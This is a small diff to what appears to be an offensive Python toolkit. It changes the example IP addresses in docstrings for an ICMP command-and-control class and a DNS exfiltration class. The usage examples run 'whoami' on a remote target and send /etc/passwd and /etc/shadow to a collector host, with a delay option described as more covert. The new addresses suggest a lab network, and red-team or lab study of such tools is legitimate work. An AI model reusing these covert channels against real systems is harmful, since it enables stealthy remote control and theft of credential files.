@@ -24,7 +24,7 @@ class IcmpC2:
     The target must be running icmp_agent.py.
 
     Usage:
-        c2 = IcmpC2("10.0.0.2")
+        c2 = IcmpC2("192.168.56.2")
         output = c2.run("whoami")
         print(output)
     """
@@ -52,7 +52,7 @@ class DnsExfil:
     Requires dns_collector.py running on the collector host.
 
     Usage:
-        exfil = DnsExfil(collector_ip="10.0.0.1")
+        exfil = DnsExfil(collector_ip="192.168.56.1")
         exfil.send("/etc/passwd")
         exfil.send("/etc/shadow", delay=0.5)   # slower, more covert
     """
